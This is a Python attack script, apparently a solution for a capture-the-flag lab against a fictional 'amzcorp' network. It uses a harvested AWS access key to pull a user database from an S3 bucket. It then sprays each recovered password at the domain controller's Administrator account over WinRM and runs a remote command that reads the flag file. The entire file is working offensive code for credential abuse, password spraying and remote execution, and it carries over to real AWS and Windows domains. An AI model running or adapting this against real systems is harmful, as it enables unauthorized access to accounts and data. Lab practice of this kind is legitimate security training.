#!/usr/bin/env python3
"""Download amzcorp_users.db from S3 and spray Administrator (Flag 10)."""
import os
import sqlite3
import subprocess
import sys
from pathlib import Path


def _require_env(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        sys.exit(f"Set {name}")
    return v


WILL_KEY = _require_env("WILL_AWS_KEY")
WILL_SECRET = _require_env("WILL_AWS_SECRET")
ENDPOINT = os.environ.get("AWS_ENDPOINT", "http://cloud.amzcorp.local")
DC = os.environ.get("DC_IP", "10.13.37.15")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    db_path = root / "artifacts" / "s3" / "amzcorp_users.db"
    db_path.parent.mkdir(parents=True, exist_ok=True)
    env = {
        **os.environ,
        "AWS_ACCESS_KEY_ID": WILL_KEY,
        "AWS_SECRET_ACCESS_KEY": WILL_SECRET,
        "AWS_DEFAULT_REGION": "us-east-1",
    }
    subprocess.check_call(
        [
            "aws",
            "--endpoint-url",
            ENDPOINT,
            "s3api",
            "get-object",
            "--bucket",
            "databases",
            "--key",
            "amzcorp_users.db",
            str(db_path),
        ],
        env=env,
    )
    con = sqlite3.connect(db_path)
    rows = con.execute("select username, password from users").fetchall()
    print("sqlite users:", rows)
    for _user, password in rows:
        r = subprocess.run(
            [
                "python3",
                "-c",
                (
                    "import winrm; s=winrm.Session('" + DC + "', auth=('Administrator', '" + password.replace("'", "\\'") + "'), transport='ntlm'); "
                    "print(s.run_cmd('type C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt').std_out.decode())"
                ),
            ],
            capture_output=True,
            text=True,
        )
        if r.returncode == 0 and r.stdout.strip():
            print("FLAG:", r.stdout.strip())
            return
    print("No Administrator password matched", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
